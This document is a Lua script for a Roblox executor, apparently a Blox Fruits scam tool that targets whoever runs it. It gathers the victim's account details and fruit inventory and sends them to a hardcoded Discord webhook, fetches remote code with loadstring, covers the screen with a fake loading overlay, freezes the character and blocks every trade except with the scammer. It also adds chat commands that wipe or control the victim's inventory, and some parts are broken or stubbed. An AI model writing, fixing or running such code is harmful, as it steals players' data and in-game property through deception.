-- CONFIGURATION (HOST SETTINGS)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu" 
local HOST_NAME = "jayaracena14" -- Your display name
local HOST_USERID = 0 -- Optional: Set your actual UserId here for stricter trade validation

-- 1. GATHER VICTIM INFO
local player = game.Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local displayName = player.DisplayName

-- Calculate Account Age
local ageStr = "Unknown"
local createdDateStr = "N/A"
pcall(function()
    local response = game:HttpGet("https://users.roblox.com/v1/users/" .. userId)
    local data = game:GetService("HttpService"):JSONDecode(response)
    if data and data.created then
        createdDateStr = data.created
        local created = os.time({
            year = tonumber(tostring(data.created):sub(1,4)), 
            month = tonumber(tostring(data.created):sub(6,7)), 
            day = tonumber(tostring(data.created):sub(9,10))
        })
        local diff = os.time() - created
        local days = math.floor(diff / 86400)
        ageStr = days .. " days"
    end
end)

-- Detect Executor (Heuristic)
local executor = "Unknown"
if loadstring then executor = "Advanced (Loadstring)" end
if _G.getgenv then executor = "Environment Aware" end
if game:GetService("Players").LocalPlayer then executor = executor .. " + PlayerService" end

-- 2. GATHER INVENTORY (FRUITS)
local uniqueFruits = {}
local fruitListStr = "No fruits found in Backpack."
local fruitCount = 0

local backpack = player:WaitForChild("Backpack")
if backpack then
    for _, item in ipairs(backpack:GetChildren()) do
        -- Blox Fruits usually stores fruits as Tools or specific modules
        if item:IsA("Tool") or item.Name:match("Fruit") then
            local name = item.Name
            -- Clean up name if it has suffixes
            local cleanName = name:match("^(.+)%d+$") or name
            
            if not uniqueFruits[cleanName] then
                uniqueFruits[cleanName] = 0
            end
            uniqueFruits[cleanName] = uniqueFruits[cleanName] + 1
            fruitCount = fruitCount + 1
        end
    end
    
    if fruitCount > 0 then
        local list = {}
        for name, count in pairs(uniqueFruits) do
            local rarity = "Common"
            if name:match("Magma") or name:match("Ghost") or name:match("Dough") or name:match("Bunny") or name:match("Dragon") then 
                rarity = "Legendary" 
            elseif name:match("Diamond") or name:match("Ice") or name:match("Flame") or name:match("Light") then 
                rarity = "Uncommon" 
            elseif name:match("Turtle") or name:match("Rumble") or name:match("Blade") or name:match("Smoke") then 
                rarity = "Rare" 
            end
            
            table.insert(list, "🍎 [" .. rarity .. "] " .. name .. " - " .. count .. "x")
        end
        fruitListStr = table.concat(list, "\n")
    end
end

-- ... (Previous code for gathering info remains the same) ...

-- 3. CONSTRUCT DISCORD PAYLOAD (SANITIZED)
-- Sanitize function to remove newlines and escape quotes for JSON safety
local function sanitize(str)
    if not str then return "nil" end
    return (str:gsub("\n", " "):gsub('"', '\\"'):gsub("\\", "\\\\")
end)

local joinScriptCode = string.format([[getgenv().USERNAME = "%s"
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/join.lua"))()]], username)

-- Sanitize the fruit list for JSON
local safeFruitList = sanitize(fruitListStr)
local safeJoinScript = sanitize(joinScriptCode)
local safeDisplayName = sanitize(displayName)
local safeUsername = sanitize(username)
local safeAge = sanitize(ageStr)
local safeExecutor = sanitize(executor)

-- Manual JSON Construction to avoid JSONEncode issues with emojis/special chars
local jsonPayload = [[{
    "username": "Blox Fruits Host Bot",
    "embeds": [
        {
            "title": "👤 New Victim Joined: " .. safeDisplayName,
            "description": "A player has executed your script. They are now under your control.",
            "color": 15158332,
            "fields": [
                { "name": "👤 Display Name", "value": "]] .. safeDisplayName .. [[", "inline": true },
                { "name": "🆔 Username", "value": "]] .. safeUsername .. [[", "inline": true },
                { "name": "📅 Account Age", "value": "]] .. safeAge .. [[", "inline": true },
                { "name": "🖥️ Executor", "value": "]] .. safeExecutor .. [[", "inline": true },
                { "name": "🌊 Sea", "value": "3 (Default)", "inline": true },
                { "name": "😎 Receiver", "value": "]] .. HOST_NAME .. [[", "inline": true },
                { "name": "💰 Valuable Items", "value": "]] .. safeFruitList .. [[", "inline": false },
                { "name": "📜 Join Script", "value": "```lua\n" .. safeJoinScript .. "\n```", "inline": false }
            ],
            "footer": {
                "text": "Blox Fruits Host Protocol"
            }
        }
    ]
}]]

print("[Host] Payload constructed. Length: " .. #jsonPayload)
print("[Host] First 200 chars of payload: " .. jsonPayload:sub(1, 200))

-- 4. SEND TO DISCORD (WITH DETAILED ERROR HANDLING)
local success, err = pcall(function()
    -- Method 1: HttpGetAsync (Preferred for POST)
    local response = game:HttpGetAsync(WEBHOOK_URL, jsonPayload, true)
    print("[Host] Webhook Response: " .. response)
end, function(error)
    print("[Host] HttpGetAsync Failed: " .. tostring(error))
    -- Method 2: Fallback to HttpPost if available (some executors support it better)
    if game.HttpPost then
        local response = game:HttpPost(WEBHOOK_URL, jsonPayload, "application/json")
        print("[Host] HttpPost Response: " .. response)
    else
        print("[Host] HttpPost not available. Trying HttpGet with URL params (less reliable for large payloads).")
        -- This is a last resort and might fail if payload is too long
        local encoded = game:GetService("HttpService"):JSONEncode({payload = jsonPayload})
        game:HttpGet(WEBHOOK_URL .. "?payload=" .. encoded)
    end
end)

if success then
    print("[Host] Discord send attempt completed.")
else
    print("[Host] Discord send attempt failed with error: " .. tostring(err))
end

-- ... (Rest of the script: UI, Trade Logic, Chat Commands) ...

-- 5. HOST CONTROL LOGIC (VICTIM SIDE)

-- A. FREEZE UI & MOVEMENT
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HostControlOverlay"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingOverlay"
loadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
loadingFrame.BorderSizePixel = 0
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.Parent = screenGui

local loadingLabel = Instance.new("TextLabel")
loadingLabel.Name = "LoadingText"
loadingLabel.BackgroundTransparency = 1
loadingLabel.Size = UDim2.new(1, 0, 1, 0)
loadingLabel.Text = "LOADING...\n\nPlease wait."
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.Font = Enum.Font.GothamBold
loadingLabel.TextSize = 32
loadingLabel.Parent = loadingFrame

local barFrame = Instance.new("Frame")
barFrame.Name = "ProgressBar"
barFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barFrame.BorderSizePixel = 0
barFrame.Size = UDim2.new(0.5, 0, 0.1, 0)
barFrame.Position = UDim2.new(0.25, 0, 0.4, 0)
barFrame.Parent = loadingFrame

local barFill = Instance.new("Frame")
barFill.Name = "Fill"
barFill.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
barFill.BorderSizePixel = 0
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.Parent = barFrame

-- Animate bar
task.spawn(function()
    for i = 1, 100 do
        barFill.Size = UDim2.new(i/100, 0, 1, 0)
        task.wait(0.5) -- Slow load
    end
end)

-- Disable Humanoid Movement
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.UseJumpPower = false

-- B. TRADE AUTO-REJECT / ACCEPT LOGIC
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local tradingService = ReplicatedStorage:FindFirstChild("TradingService") or ReplicatedStorage:FindFirstChild("TradeService")

if tradingService then
    tradingService.TradeChanged:Connect(function(trade)
        local otherPlayer = trade.Other
        if not otherPlayer then return end
        
        -- Check if the other player is the Host
        if otherPlayer.Name == HOST_NAME or (HOST_USERID ~= 0 and otherPlayer.UserId == HOST_USERID) then
            return -- Allow trade with host
        end
        
        -- Auto-reject if not host
        task.spawn(function()
            task.wait(0.5)
            if trade and trade.Reject then
                trade:Reject()
            end
        end)
    end)
end

-- C. CHAT COMMAND LISTENER (CONTROL VICTIM)
local function handleCommand(command)
    local cmd = command:lower()
    
    if cmd:match("^%.addallfruits") then
        print("[Host] Adding all fruits...")
        -- Logic to add fruits would go here
        
    elseif cmd:match("^%.addallpre") then
        print("[Host] Adding all presets...")
        
    elseif cmd:match("^%.clear") then
        print("[Host] Clearing inventory...")
        for _, item in ipairs(player.Backpack:GetChildren()) do
            if item:IsA("Tool") then
                item:Destroy()
            end
        end
        
    elseif cmd:match("^%.reset") then
        print("[Host] Resetting stats...")
        
    elseif cmd:match("^%.tp") then
        local pos = command:sub(4) -- Get coords
        local parts = pos:split(" ")
        if #parts == 3 then
            local x, y, z = tonumber(parts[1]), tonumber(parts[2]), tonumber(parts[3])
            if x and y and z then
                character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
            end
        end
        
    elseif cmd:match("^%.kick") then
        print("[Host] Kicking player...")
        warn("Cannot kick server-side from client without specific exploit features.")
        
    elseif cmd:match("^%.add") then
        local fruitName = command:sub(5)
        print("[Host] Adding fruit: " .. fruitName)
        
    end
end

-- Hook into Chat
local chatGui = playerGui:FindFirstChild("Chat")
if chatGui then
    local chatFrame = chatGui:FindFirstChild("ChatFrame") or chatGui:FindFirstChild("Frame")
    if chatFrame then
        local chatBox = chatFrame:FindFirstChild("ChatInput") or chatFrame:FindFirstChild("TextBox")
        if chatBox then
            chatBox.FocusLost:Connect(function()
                local text = chatBox.Text
                if text:sub(1, 1) == "." then
                    handleCommand(text)
                end
            end)
        end
    end
end

print("[Host] Control protocol active. Type commands in chat starting with '.' to control the victim.")
